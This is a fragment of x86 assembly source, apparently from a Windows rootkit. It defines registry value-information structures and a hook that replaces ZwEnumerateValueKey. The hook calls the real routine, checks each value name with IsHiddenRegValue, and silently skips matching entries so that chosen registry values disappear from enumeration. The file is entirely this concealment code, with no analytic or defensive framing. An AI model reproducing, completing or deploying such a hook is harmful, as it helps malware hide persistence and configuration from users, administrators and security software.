

KEY_VALUE_BASIC_INFORMATION struc
	TitleIndex dd ?
	_Type      dd ?
	NameLength dd ?
	_Name      dw ?
KEY_VALUE_BASIC_INFORMATION ends


KEY_VALUE_FULL_INFORMATION struc
	TitleIndex dd ?
	_Type      dd ?
	DataOffset dd ?
	DataLength dd ?
	NameLength dd ?
	_Name      dw ?
KEY_VALUE_FULL_INFORMATION ends

.code

;; -------------------------------------------------------------------------------- ;;
NewZwEnumerateValueKey proc p1:dword, p2:dword, p3:dword, p4:dword, p5:dword, p6:dword
	local RealZwEnumerateKey : dword
	local nCount : dword
	local lpName : dword

	mov RealZwEnumerateKey, eax
	mov nCount, 0

	mov eax, p4
	.if p3==0
		lea eax, (KEY_VALUE_BASIC_INFORMATION ptr [eax])._Name
	.elseif p3==1
		lea eax, (KEY_VALUE_FULL_INFORMATION ptr [eax])._Name
	.else
		xor eax, eax
		push p2
		pop nCount
	.endif
	mov lpName, eax

@RealZwEnumerateKey:
	push p6					; ResultLength
	push p5					; Length
	push p4					; KeyValueInformation
	push p3					; KeyValueInformationClass
	push nCount				; Index
	push p1					; KeyHandle
	call RealZwEnumerateKey	; Real ZwEnumerateValueKey
	.if eax!=STATUS_SUCCESS
		ret
	.endif

	.if lpName==0
		ret
	.endif

	pushad

; Decision: to hide or not to hide
	mov ebx, lpName
	call IsHiddenRegValue
	.if ebx!=0
		inc p2
	.endif

	mov eax, p2
	.if nCount==eax
		popad
		ret
	.endif
	inc nCount

	popad
	jmp @RealZwEnumerateKey
NewZwEnumerateValueKey endp

